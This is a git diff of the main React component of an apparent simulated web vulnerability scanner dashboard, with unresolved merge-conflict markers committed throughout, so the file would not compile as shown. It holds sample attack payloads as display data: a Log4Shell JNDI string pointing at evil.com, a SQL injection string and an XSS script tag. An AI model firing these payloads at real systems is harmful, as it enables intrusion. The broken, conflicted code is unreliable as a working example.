@@ -5,6 +5,7 @@ import TerminalLog from './components/TerminalLog';
 import DashboardStats from './components/DashboardStats';
 import VulnerabilityList from './components/VulnerabilityList';
 import AuthPage from './components/AuthPage';
+<<<<<<< HEAD
 import Tooltip from './components/Tooltip';
 import ChatInterface from './components/ChatInterface';
 import { generateRemediationReport, analyzeTargetSurface } from './services/geminiService';
@@ -14,6 +15,13 @@ import { Play, Square, Settings2, Search, AlertTriangle, ChevronRight, Download,
 import ReactMarkdown from 'react-markdown';
 import html2canvas from 'html2canvas';
 import { jsPDF } from 'jspdf';
+=======
+import { generateRemediationReport, analyzeTargetSurface } from './services/geminiService';
+import { db } from './services/database';
+import { EngineStatus, LogEntry, ScanConfig, ScanStats, Severity, Vulnerability, User } from './types';
+import { Play, Square, Settings2, Search, AlertTriangle, ChevronRight, Download, FileText, ArrowLeft, Shield, History, CheckCircle2 } from 'lucide-react';
+import ReactMarkdown from 'react-markdown';
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
 
 const App: React.FC = () => {
   // --- Auth State ---
@@ -29,9 +37,12 @@ const App: React.FC = () => {
   const [aiLoading, setAiLoading] = useState(false);
   const [reportCache, setReportCache] = useState<Record<string, string>>({});
   const [selectedVulnId, setSelectedVulnId] = useState<string | null>(null);
+<<<<<<< HEAD
   const [scanProgress, setScanProgress] = useState(0);
   const [currentPhase, setCurrentPhase] = useState<string>('Idle');
   const [isExporting, setIsExporting] = useState(false);
+=======
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
   
   const [config, setConfig] = useState<ScanConfig>({
     targetUrl: 'https://example-target.com',
@@ -59,7 +70,14 @@ const App: React.FC = () => {
 
   // --- Initialization & Auth Check ---
   useEffect(() => {
+<<<<<<< HEAD
     db.init();
+=======
+    // Initialize DB (seed admin if needed)
+    db.init();
+    
+    // Check for active session
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
     const session = db.getSession();
     if (session) {
       setUser(session);
@@ -76,6 +94,10 @@ const App: React.FC = () => {
     setUser(null);
     setStatus(EngineStatus.IDLE);
     setActiveTab('dashboard');
+<<<<<<< HEAD
+=======
+    // Clear simulation intervals if running
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
     if (statsIntervalRef.current) window.clearInterval(statsIntervalRef.current);
     if (logIntervalRef.current) window.clearInterval(logIntervalRef.current);
   };
@@ -93,11 +115,17 @@ const App: React.FC = () => {
 
   const stopScan = useCallback(() => {
     setStatus(EngineStatus.COMPLETED);
+<<<<<<< HEAD
     setScanProgress(100);
     setCurrentPhase('Scan Complete');
     if (statsIntervalRef.current) window.clearInterval(statsIntervalRef.current);
     if (logIntervalRef.current) window.clearInterval(logIntervalRef.current);
     addLog('Scan process terminated.', 'warning', 'CORE');
+=======
+    if (statsIntervalRef.current) window.clearInterval(statsIntervalRef.current);
+    if (logIntervalRef.current) window.clearInterval(logIntervalRef.current);
+    addLog('Scan process terminated by user or completion.', 'warning', 'CORE');
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
   }, [addLog]);
 
   const startScan = useCallback(() => {
@@ -107,14 +135,18 @@ const App: React.FC = () => {
     setAiReport(null);
     setReportCache({});
     setSelectedVulnId(null);
+<<<<<<< HEAD
     setScanProgress(0);
     setCurrentPhase('Initializing');
+=======
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
     setStats({ requests: 0, duration: 0, vulnsFound: 0, criticalCount: 0, highCount: 0, subdomains: 0 });
     setActiveTab('scan');
 
     addLog(`Initializing SentinelFuzz Pro v2.5.0`, 'info', 'CORE');
     addLog(`Target locked: ${config.targetUrl}`, 'info', 'CORE');
     
+<<<<<<< HEAD
     // Scan Data Pools
     const subdomainsPool = ['api', 'dev', 'staging', 'auth', 'legacy', 'admin', 'internal', 'vpn', 'mail', 'test'];
     const endpointsPool = ['/login', '/api/v1/user', '/search', '/upload', '/admin/config', '/debug', '/graphql', '/oauth/token'];
@@ -128,18 +160,29 @@ const App: React.FC = () => {
       "${jndi:ldap://evil.com/a}"
     ];
 
+=======
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
     if (config.engines.recon) {
       addLog('Engine A (Recon) initialized. Enumerating subdomains...', 'info', 'RECON');
     }
 
+<<<<<<< HEAD
     statsIntervalRef.current = window.setInterval(() => {
       setStats(prev => ({
         ...prev,
         requests: prev.requests + Math.floor(Math.random() * 80) + 20,
+=======
+    // Simulate Stats Ticking
+    statsIntervalRef.current = window.setInterval(() => {
+      setStats(prev => ({
+        ...prev,
+        requests: prev.requests + Math.floor(Math.random() * 50) + 10,
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
         duration: prev.duration + 1
       }));
     }, 1000);
 
+<<<<<<< HEAD
     let step = 0;
     const maxSteps = 60; // Increased steps for better simulation
     
@@ -216,15 +259,82 @@ const App: React.FC = () => {
         addLog('Scan cycle complete. Generating summary report...', 'success', 'REPORT');
         if (config.engines.reporting) {
             analyzeTargetSurface(config.targetUrl, subdomainsPool.slice(0, 3)).then(res => {
+=======
+    // Simulate Logs and Findings Sequence
+    let step = 0;
+    const subdomains = ['api', 'dev', 'staging', 'admin-portal', 'legacy'];
+    
+    logIntervalRef.current = window.setInterval(() => {
+      step++;
+      
+      // RECON PHASE
+      if (step < 10 && config.engines.recon) {
+        if (Math.random() > 0.6) {
+          const sub = subdomains[Math.floor(Math.random() * subdomains.length)];
+          addLog(`Discovered subdomain: ${sub}.${config.targetUrl.replace('https://', '')}`, 'success', 'RECON');
+          setStats(prev => ({ ...prev, subdomains: prev.subdomains + 1 }));
+        }
+      }
+
+      // TRANSITION TO FUZZING
+      if (step === 12) {
+        addLog('Recon complete. Map built. Initializing Engine B (Fuzzing)...', 'info', 'CORE');
+      }
+
+      // FUZZING PHASE
+      if (step > 15 && step < 40 && config.engines.fuzzing) {
+        addLog(`Injecting payloads into param 'q' at /search...`, 'info', 'FUZZ');
+        
+        // Random Vulnerability Discovery
+        if (Math.random() > 0.85) {
+          const isCrit = Math.random() > 0.5;
+          const newVuln: Vulnerability = {
+            id: Math.random().toString(),
+            title: isCrit ? 'SQL Injection (Union Based)' : 'Reflected XSS',
+            description: 'Input parameter was reflected without sanitization',
+            severity: isCrit ? Severity.CRITICAL : Severity.MEDIUM,
+            endpoint: isCrit ? '/api/v1/login' : '/search?q=',
+            payload: isCrit ? "' OR 1=1 --" : "<script>alert(1)</script>",
+            timestamp: Date.now()
+          };
+          
+          setVulns(prev => [...prev, newVuln]);
+          setStats(prev => ({
+            ...prev,
+            vulnsFound: prev.vulnsFound + 1,
+            criticalCount: isCrit ? prev.criticalCount + 1 : prev.criticalCount,
+            highCount: !isCrit && isCrit ? prev.highCount + 1 : prev.highCount 
+          }));
+          addLog(`VULNERABILITY DETECTED: ${newVuln.title}`, 'error', 'FUZZ');
+        }
+      }
+
+      // COMPLETION
+      if (step > 45) {
+        stopScan();
+        addLog('Scan cycle complete. Generating summary report...', 'success', 'REPORT');
+        if (config.engines.reporting) {
+            // Auto analyze surface if report engine is on
+            analyzeTargetSurface(config.targetUrl, subdomains).then(res => {
+                // Just logging it for simulation feel, actual report is on demand
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                 addLog('Surface analysis complete.', 'info', 'AI-AGENT');
             });
         }
       }
 
+<<<<<<< HEAD
     }, 600);
   }, [config, addLog, stopScan]);
 
 
+=======
+    }, 800);
+  }, [config, addLog, stopScan]);
+
+
+  // Cleanup on unmount
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
   useEffect(() => {
     return () => {
       if (statsIntervalRef.current) window.clearInterval(statsIntervalRef.current);
@@ -256,6 +366,7 @@ const App: React.FC = () => {
     setAiReport(null);
   };
 
+<<<<<<< HEAD
   const handleRetryReport = () => {
       if(selectedVulnId) {
           // Clear cache for this ID to force retry
@@ -320,6 +431,10 @@ const App: React.FC = () => {
     standard: "Balanced speed and depth.",
     aggressive: "High speed. High risk of detection."
   };
+=======
+  const generatedReports = vulns.filter(v => reportCache[v.id]);
+  const pendingReports = vulns.filter(v => !reportCache[v.id]);
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
 
   if (authLoading) {
     return (
@@ -346,7 +461,10 @@ const App: React.FC = () => {
               {activeTab === 'scan' && 'Live Operations'}
               {activeTab === 'vulns' && 'Vulnerability Matrix'}
               {activeTab === 'reports' && 'Intelligence Reports'}
+<<<<<<< HEAD
               {activeTab === 'assistant' && 'SentinelBot Assistant'}
+=======
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
               {activeTab === 'config' && 'System Configuration'}
             </h1>
             <p className="text-sm text-zinc-500 mt-1 flex items-center gap-2">
@@ -395,6 +513,7 @@ const App: React.FC = () => {
                  <TerminalLog logs={logs} />
                </div>
                <div className="space-y-6 h-full overflow-y-auto">
+<<<<<<< HEAD
                  
                  {/* Enhanced Progress Visualization */}
                  <div className="bg-surface p-5 rounded-xl border border-zinc-800 shadow-lg relative overflow-hidden">
@@ -492,6 +611,33 @@ const App: React.FC = () => {
                       {Object.entries(config.engines).map(([key, active]) => (
                         <div key={key} className="flex items-center justify-between p-2 rounded bg-black/20">
                           <span className="capitalize text-sm text-zinc-300">{key} Engine</span>
+=======
+                 <div className="bg-surface p-4 rounded-xl border border-zinc-800">
+                   <h3 className="text-sm font-bold text-zinc-400 uppercase tracking-wider mb-4">Live Metrics</h3>
+                   <div className="space-y-4">
+                      <div className="flex justify-between items-center">
+                        <span className="text-sm text-zinc-500">Status</span>
+                        <span className={`text-xs px-2 py-0.5 rounded-full font-bold ${status === EngineStatus.RUNNING ? 'bg-emerald-500/20 text-emerald-500' : 'bg-zinc-700 text-zinc-300'}`}>
+                          {status}
+                        </span>
+                      </div>
+                      <div className="flex justify-between items-center">
+                         <span className="text-sm text-zinc-500">Duration</span>
+                         <span className="font-mono text-white">{stats.duration}s</span>
+                      </div>
+                      <div className="w-full bg-zinc-800 h-1.5 rounded-full overflow-hidden">
+                        <div className="bg-primary h-full rounded-full animate-[pulse_2s_infinite]" style={{width: status === EngineStatus.RUNNING ? '100%' : '0%'}}></div>
+                      </div>
+                   </div>
+                 </div>
+
+                 <div className="bg-surface p-4 rounded-xl border border-zinc-800">
+                    <h3 className="text-sm font-bold text-zinc-400 uppercase tracking-wider mb-4">Active Engines</h3>
+                    <div className="space-y-2">
+                      {Object.entries(config.engines).map(([key, active]) => (
+                        <div key={key} className="flex items-center justify-between p-2 rounded bg-black/20">
+                          <span className="capitalize text-sm text-zinc-300">{key}</span>
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                           <div className={`w-2 h-2 rounded-full ${active ? (status === EngineStatus.RUNNING ? 'bg-emerald-500 animate-pulse' : 'bg-emerald-500') : 'bg-zinc-700'}`} />
                         </div>
                       ))}
@@ -621,6 +767,7 @@ const App: React.FC = () => {
                 <div className="flex flex-col h-full animate-in fade-in slide-in-from-bottom-4 duration-500">
                   <div className="p-6 border-b border-zinc-800 flex items-center justify-between bg-zinc-900/30">
                     <div className="flex items-center gap-4">
+<<<<<<< HEAD
                       {/* Back Button with Breadcrumbs */}
                       <button 
                         onClick={handleBackToReports}
@@ -640,10 +787,25 @@ const App: React.FC = () => {
                            <span className={isOfflineReport ? "text-yellow-500" : "text-emerald-500"}>
                              {isOfflineReport ? "Template Generated" : "AI Generated"}
                            </span>
+=======
+                      <button 
+                        onClick={handleBackToReports}
+                        className="p-2 hover:bg-zinc-800 rounded-lg text-zinc-400 hover:text-white transition-colors border border-transparent hover:border-zinc-700"
+                      >
+                        <ArrowLeft className="w-5 h-5" />
+                      </button>
+                      <div>
+                        <h2 className="text-xl font-bold text-white">Vulnerability Analysis</h2>
+                        <div className="flex items-center gap-2 text-xs text-zinc-500 font-mono mt-0.5">
+                           <span>ID: {selectedVulnId.split('-')[0]}...</span>
+                           <span>•</span>
+                           <span className="text-emerald-500">AI Generated</span>
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                            {reportCache[selectedVulnId] && <span className="text-zinc-600">(Cached)</span>}
                         </div>
                       </div>
                     </div>
+<<<<<<< HEAD
                     
                     <div className="flex items-center gap-3">
                       {isOfflineReport && (
@@ -684,6 +846,15 @@ const App: React.FC = () => {
                       </div>
                     )}
 
+=======
+                    <button className="flex items-center gap-2 text-sm bg-primary/10 hover:bg-primary/20 text-primary px-4 py-2 rounded-lg border border-primary/20 transition-colors">
+                      <Download className="w-4 h-4" />
+                      Export Report
+                    </button>
+                  </div>
+                  
+                  <div className="flex-1 overflow-y-auto p-8">
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                     <article className="prose prose-invert prose-headings:text-emerald-400 prose-p:text-zinc-300 prose-a:text-blue-400 prose-code:text-orange-300 prose-pre:bg-zinc-900 prose-pre:border prose-pre:border-zinc-800 max-w-4xl mx-auto">
                       <ReactMarkdown>{aiReport}</ReactMarkdown>
                     </article>
@@ -693,12 +864,15 @@ const App: React.FC = () => {
             </div>
           )}
 
+<<<<<<< HEAD
           {activeTab === 'assistant' && (
             <div className="h-[70vh]">
                 <ChatInterface />
             </div>
           )}
 
+=======
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
           {activeTab === 'config' && (
              <div className="grid md:grid-cols-2 gap-8">
                <div className="bg-surface p-6 rounded-xl border border-zinc-800">
@@ -709,12 +883,16 @@ const App: React.FC = () => {
                     {Object.entries(config.engines).map(([key, value]) => (
                       <label key={key} className="flex items-center justify-between p-4 rounded-lg bg-black/20 border border-zinc-800 hover:border-zinc-700 cursor-pointer transition-all">
                         <div className="flex flex-col">
+<<<<<<< HEAD
                            <div className="flex items-center gap-2">
                              <span className="capitalize font-medium text-zinc-200">{key} Engine</span>
                              <Tooltip content={engineDescriptions[key]} position="top">
                                <Info className="w-3.5 h-3.5 text-zinc-500 hover:text-primary transition-colors cursor-help" />
                              </Tooltip>
                            </div>
+=======
+                           <span className="capitalize font-medium text-zinc-200">{key} Engine</span>
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                            <span className="text-xs text-zinc-500">
                              {key === 'recon' && 'Subdomains, VHosts, Directory Enumeration'}
                              {key === 'fuzzing' && 'Payload Injection (SQLi, XSS, RCE)'}
@@ -740,12 +918,17 @@ const App: React.FC = () => {
                       <button
                         key={level}
                         onClick={() => setConfig(prev => ({ ...prev, aggressionLevel: level as any }))}
+<<<<<<< HEAD
                         className={`w-full text-left p-4 rounded-lg border transition-all flex items-center justify-between group ${
+=======
+                        className={`w-full text-left p-4 rounded-lg border transition-all flex items-center justify-between ${
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                           config.aggressionLevel === level 
                           ? 'bg-primary/10 border-primary text-primary' 
                           : 'bg-black/20 border-zinc-800 text-zinc-400 hover:border-zinc-600'
                         }`}
                       >
+<<<<<<< HEAD
                         <div className="flex items-center gap-2">
                           <span className="capitalize font-medium">{level} Mode</span>
                           <Tooltip content={aggressionDescriptions[level]} position="top">
@@ -754,6 +937,9 @@ const App: React.FC = () => {
                             }`} />
                           </Tooltip>
                         </div>
+=======
+                        <span className="capitalize font-medium">{level} Mode</span>
+>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                         {config.aggressionLevel === level && <ChevronRight className="w-5 h-5" />}
                       </button>
                     ))}
